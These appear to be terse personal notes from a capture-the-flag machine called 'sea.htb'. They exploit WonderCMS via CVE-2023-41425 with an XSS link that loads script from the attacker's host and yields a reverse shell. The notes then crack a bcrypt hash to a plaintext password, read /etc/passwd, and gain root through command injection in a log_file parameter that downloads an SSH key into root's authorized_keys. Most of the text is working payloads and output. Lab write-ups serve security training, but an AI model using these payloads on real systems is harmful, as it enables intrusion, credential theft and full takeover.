http://sea.htb/themes/bike/README.md

# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".


http://sea.htb/themes/bike/version
3.2.0



https://github.com/duck-sec/CVE-2023-41425

└─$ python3 exploit.py -u http://sea.htb/loginURL -lh 10.10.16.30 -lp 8821 -sh 10.10.16.30 -sp 8822
##################################
# Wondercms 4.3.2 XSS to RCE     #
# Original POC by prodigiousMind #
# Updated version by Ducksec     #
##################################


Check you got this stuff right!


Parsed arguments:
URL: http://sea.htb/loginURL
LHOST: 10.10.16.30
LPORT: 8821
SRVHOST: 10.10.16.30
SRVPORT: 8822


[+] xss.js is created
[+] Execute the below command in another terminal:

----------------------------
nc -lvp 8821
----------------------------

Send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.30:8822/xss.js"></script><form+action="
----------------------------



[+] Ensure that main.zip is still in this directory.
[+] Once the target successfully requests main.zip it's safe to kill this script.


[+] Once complete, you can also re-exploit by requesting: http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.30&lport=8821

Starting HTTP server to allow access to xss.js
Serving HTTP on 0.0.0.0 port 8822 (http://0.0.0.0:8822/) ...
10.129.162.188 - - [13/Jun/2026 12:10:08] "GET /xss.js HTTP/1.1" 200 -
10.129.162.188 - - [13/Jun/2026 12:10:16] "GET /main.zip HTTP/1.1" 200 -
10.129.162.188 - - [13/Jun/2026 12:10:17] "GET /main.zip HTTP/1.1" 200 -
10.129.162.188 - - [13/Jun/2026 12:10:17] "GET /main.zip HTTP/1.1" 200 -
10.129.162.188 - - [13/Jun/2026 12:10:17] "GET /main.zip HTTP/1.1" 200 -



http://sea.htb/contact.php

add below payload to website field
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.30:8822/xss.js"></script><form+action="

└─$ nc -nvlp 8821 
listening on [any] 8821 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.162.188] 56542
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 16:10:17 up 51 min,  0 users,  load average: 0.63, 0.16, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty;pty.spawn('/bin/bash')"

www-data@sea:/var/www/sea/data$ cat database.js
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2026\/06\/13 16:10:07": "127.0.0.1",
            "2026\/06\/13 16:09:37": "127.0.0.1",

this hash is bcrypt, try hashcat

└─$ hashcat -m 3200 hash ~/oscp/rockyou.txt

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q: mychemicalromance

uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(amay) gid=1000(amay) groups=1000(amay)
uid=1001(geo) gid=1001(geo) groups=1001(geo),33(www-data)

└─$ ssh amay@sea.htb 

amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)

══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:55273         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -    

 ssh -L 8080:localhost:8080 amay@sea.htb 


 POST / HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 37
Cache-Control: max-age=0
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate, br
Cookie: _xsrf=2|a6866acf|d7c7371977322fcdf2a1c0fa11ce7964|1780242429; username-127-0-0-1-8888="2|1:0|10:1780242451|23:username-127-0-0-1-8888|196:eyJ1c2VybmFtZSI6ICIwZjc5NWJlN2JjMmI0NTUxYWFiYmU1MjFkYjY4YTZjMiIsICJuYW1lIjogIkFub255bW91cyBBbmFua2UiLCAiZGlzcGxheV9uYW1lIjogIkFub255bW91cyBBbmFua2UiLCAiaW5pdGlhbHMiOiAiQUEiLCAiY29sb3IiOiBudWxsfQ==|f4c0abdcde090759d85042050ba402052f4ab11a3d011e7cc023d21a80fb5725"
Connection: keep-alive

log_file=%2Fetc%2Fpasswd&analyze_log=

           gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false

log_file=;id+#&analyze_log=

uid=0(root) gid=0(root) groups=0(root)


try revershell, it will terminated in 1-2 sec, so I upoload ssh pub file

log_file=;bash+-c+'wget+http%3A%2F%2F10.10.16.30/id_rsa.pub+-O/root/.ssh/authorized_keys'+#&analyze_log=

─$ ssh -i id_rsa root@sea.htb 

